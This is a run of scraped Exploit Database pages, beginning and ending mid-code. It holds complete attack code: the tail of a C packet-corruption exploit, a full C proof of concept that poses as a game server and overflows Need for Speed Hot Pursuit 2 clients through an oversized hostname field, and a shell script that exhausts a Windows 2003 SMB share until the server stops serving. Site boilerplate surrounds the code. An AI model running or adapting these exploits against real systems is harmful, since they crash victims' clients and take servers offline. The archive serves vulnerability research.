error: %s\n", strerror(errno));exit(EXIT_FAILURE);}addr.sin_family = AF_INET;addr.sin_port = htons(port);addr.sin_addr.s_addr = inet_addr(host);if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {fprintf(stderr, "Unable to connect: %s\n", strerror(errno));if (!first)diffit();exit(EXIT_FAILURE);}first = 0;printf("."); fflush(stdout);len = send_hello();write(s, buf, len);len = send_crap();corruptor(buf, len);write(s, buf, len);usleep(1000); /* wait.. */close(s);}exit(EXIT_SUCCESS);}// milw0rm.com [2004-01-21]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 147
Need for Speed 2 - Remote Client Buffer Overflow (PoC) - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDNeed for Speed 2 - Remote Client Buffer Overflow (PoC)EDB-ID:147CVE:2004-2099EDB Verified:Author:Luigi AuriemmaType:dosExploit:/Platform:WindowsDate:2004-01-23Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*Need for Speed 2 Remote Client Buffer Overflow Exploit - 23.01.2004by Luigi AuriemmaUNIX & WIN VERSION*/#include <stdio.h>#include <stdlib.h>#include <string.h>#ifdef WIN32#include <winsock.h>#include "winerr.h"#define close closesocket#else#include <unistd.h>#include <sys/socket.h>#include <sys/types.h>#include <arpa/inet.h>#include <netdb.h>#endif#define VER "0.1"#define BUFFSZ 2048#define PORT 61220#define RETADD 0xdeadc0de#define RETOFF 540#define NFS240 "18022640"#define NFS242 "18088178"#define NFSOFF 669 /* referred to pck[] nver, don't change it */void std_err(void);int main(int argc, char *argv[]) {int sd,err,on = 1,psz;struct sockaddr_in peer;u_char *buff,pck[] ="\\gamename\\nfs6""\\gamever\\240" // it is useless"\\hostname\\""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaa""0000" // return address"\\hostport\\8511""\\mapname\\Fall Winds""\\gametype\\Single Race""\\numplayers\\1""\\maxplayers\\8""\\gamemode\\openplaying""\\pbmd\\0""\\password\\0""\\nver\\" NFS240"\\ctid\\6""\\res\\38""\\dir\\0""\\laps\\2""\\ded\\0""\\final\\""\\queryid\\2.1";setbuf(stdout, NULL);fputs("\n""Need for Speed Hot pursuit 2 <= 242 client's buffer overflow "VER"\n""by Luigi Auriemma\n""e-mail: aluigi@altervista.org\n""web: http://aluigi.altervista.org\n""\n", stdout);if(argc < 2) {printf("\nUsage: %s <version>\n""\n""Version:\n""240 = this is the default (1.0) and more diffused version\n""242 = the latest patched version, rarely used by players\n""\n", argv[0]);exit(1);}if(!memcmp(argv[1], "240", 3)) {printf("Selected version 240 (nver %s)\n", NFS240);} else if(!memcmp(argv[1], "242", 3)) {printf("Selected version 242 (nver %s)\n", NFS242);memcpy(pck + NFSOFF, NFS242, sizeof(NFS242) - 1);} else {printf("\nError: you must choose between 240 and 242 only\n");exit(1);}#ifdef WIN32WSADATA wsadata;WSAStartup(MAKEWORD(1,0), &wsadata);#endifsd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);if(sd < 0) std_err();peer.sin_addr.s_addr = INADDR_ANY;peer.sin_port = htons(PORT);peer.sin_family = AF_INET;psz = sizeof(peer);printf("\nBinding UDP port %u\n", PORT);err = setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on));if(err < 0) std_err();err = bind(sd, (struct sockaddr *)&peer, psz);if(err < 0) std_err();printf("The return address will be overwritten with 0x%08x\n", RETADD);*(u_long *)(pck + RETOFF) = RETADD;buff = malloc(BUFFSZ);if(!buff) std_err();fputs("Clients:\n", stdout);while(1) {err = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &psz);if(err < 0) std_err();printf("%16s:%hu -> ",inet_ntoa(peer.sin_addr), htons(peer.sin_port));err = sendto(sd, pck, sizeof(pck) - 1, 0, (struct sockaddr *)&peer, psz);if(err < 0) std_err();fputs("BOOM\n", stdout);}close(sd);return(0);}#ifndef WIN32void std_err(void) {perror("\nError");exit(1);}#endif/*Header file used for manage errors in WindowsIt support socket and errno too(this header replace the previous sock_errX.h)*/#include <string.h>#include <errno.h>void std_err(void) {char *error;switch(WSAGetLastError()) {case 10004: error = "Interrupted system call"; break;case 10009: error = "Bad file number"; break;case 10013: error = "Permission denied"; break;case 10014: error = "Bad address"; break;case 10022: error = "Invalid argument (not bind)"; break;case 10024: error = "Too many open files"; break;case 10035: error = "Operation would block"; break;case 10036: error = "Operation now in progress"; break;case 10037: error = "Operation already in progress"; break;case 10038: error = "Socket operation on non-socket"; break;case 10039: error = "Destination address required"; break;case 10040: error = "Message too long"; break;case 10041: error = "Protocol wrong type for socket"; break;case 10042: error = "Bad protocol option"; break;case 10043: error = "Protocol not supported"; break;case 10044: error = "Socket type not supported"; break;case 10045: error = "Operation not supported on socket"; break;case 10046: error = "Protocol family not supported"; break;case 10047: error = "Address family not supported by protocol family"; break;case 10048: error = "Address already in use"; break;case 10049: error = "Can't assign requested address"; break;case 10050: error = "Network is down"; break;case 10051: error = "Network is unreachable"; break;case 10052: error = "Net dropped connection or reset"; break;case 10053: error = "Software caused connection abort"; break;case 10054: error = "Connection reset by peer"; break;case 10055: error = "No buffer space available"; break;case 10056: error = "Socket is already connected"; break;case 10057: error = "Socket is not connected"; break;case 10058: error = "Can't send after socket shutdown"; break;case 10059: error = "Too many references, can't splice"; break;case 10060: error = "Connection timed out"; break;case 10061: error = "Connection refused"; break;case 10062: error = "Too many levels of symbolic links"; break;case 10063: error = "File name too long"; break;case 10064: error = "Host is down"; break;case 10065: error = "No Route to Host"; break;case 10066: error = "Directory not empty"; break;case 10067: error = "Too many processes"; break;case 10068: error = "Too many users"; break;case 10069: error = "Disc Quota Exceeded"; break;case 10070: error = "Stale NFS file handle"; break;case 10091: error = "Network SubSystem is unavailable"; break;case 10092: error = "WINSOCK DLL Version out of range"; break;case 10093: error = "Successful WSASTARTUP not yet performed"; break;case 10071: error = "Too many levels of remote in path"; break;case 11001: error = "Host not found"; break;case 11002: error = "Non-Authoritative Host not found"; break;case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;case 11004: error = "Valid name, no data record of requested type"; break;default: error = strerror(errno); break;}fprintf(stderr, "\nError: %s\n", error);exit(1);}// milw0rm.com [2004-01-23]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 148
Microsoft Windows XP/2003 - Samba Share Resource Exhaustion (Denial of Service) - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows XP/2003 - Samba Share Resource Exhaustion (Denial of Service)EDB-ID:148CVE:EDB Verified:Author:Steve LadjabiType:dosExploit:/Platform:WindowsDate:2004-01-25Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/bin/sh# winblast v3 - DoS on WinXP, Win2003Srv# 2003-12-04 Steve Ladjabi## I've encountered a strange problem mounting a Windows server share.# My setup: Debian Linux, smbmount 3.0.0beta2 and Windows 2003 Server.## When the client creates and deletes a lot of files on the server, the# server suddenly ceases serving, i.e. you can not access files nor list# directory contents any more.# Example:# knoppix:/mnt # ll /mnt/test# ls: /mnt/test: Cannot allocate memory## The only way to get the server working again is to reboot it. Rebooting# the client does not help.## If you want to try for yourself, check this shell script. The script will# create 1000 directories and then takes turns deleting and re-creating# them. There will be no more than those 1000 directories at any time.# After having created (and deleted) 3.5 millions directories the server# denies access to the share.count=0# using 'pathcount' directoriespathcount=1000echo running \'winblast v3\' with $pathcount files in loop ...while [ 1 ]; dop=$((pathcount*2-1))stop=$((pathcount-1))while [ "$p" != "$stop" ]; dodirname=wbst$p# delete old directory if it exists and exit on any errorif [ -d $dirname ]; thenrmdir $dirname || exit 3fi;# generating directory and exit on any errormkdir $dirname || exit 1p=$((p-1))count=$((count+1))done;echo $count directories generated ...done;#-- end --# milw0rm.com [2004-01-25]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a 